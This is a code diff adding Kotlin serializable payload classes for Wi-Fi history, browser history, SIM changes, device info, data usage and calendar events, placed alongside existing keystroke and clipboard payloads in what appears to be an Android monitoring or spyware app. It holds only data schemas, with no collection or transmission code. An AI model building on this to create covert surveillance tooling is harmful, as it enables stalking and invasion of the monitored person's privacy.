@@ -144,6 +144,71 @@ data class ClipboardPayload(
 )
 
 @Serializable
+data class WifiHistoryPayload(
+    val ssid: String,
+    val bssid: String? = null,
+    val signalLevel: Int? = null,
+    val frequency: Int? = null,
+    val ipAddress: String? = null,
+    val linkSpeed: Int? = null,
+    val connected: Boolean,
+    val timestampMs: Long,
+)
+
+@Serializable
+data class BrowserHistoryPayload(
+    val url: String,
+    val title: String? = null,
+    val visitTime: Long,
+    val browser: String,
+)
+
+@Serializable
+data class SimChangePayload(
+    val simState: String,
+    val carrierId: String? = null,
+    val carrierName: String? = null,
+    val countryIso: String? = null,
+    val phoneNumber: String? = null,
+    val simSlot: Int? = null,
+    val timestampMs: Long,
+)
+
+@Serializable
+data class DeviceInfoPayload(
+    val totalStorage: Long,
+    val freeStorage: Long,
+    val totalRam: Long,
+    val freeRam: Long,
+    val runningApps: Int,
+    val uptimeMs: Long,
+    val androidVersion: String,
+    val model: String,
+    val manufacturer: String,
+    val timestampMs: Long,
+)
+
+@Serializable
+data class DataUsagePayload(
+    val packageName: String,
+    val appName: String? = null,
+    val txBytes: Long,
+    val rxBytes: Long,
+    val period: String,
+)
+
+@Serializable
+data class CalendarEventPayload(
+    val title: String,
+    val description: String? = null,
+    val location: String? = null,
+    val startTime: Long,
+    val endTime: Long,
+    val calendarName: String? = null,
+    val allDay: Boolean = false,
+)
+
+@Serializable
 data class KeystrokePayload(
     val packageName: String,
     val appName: String? = null,
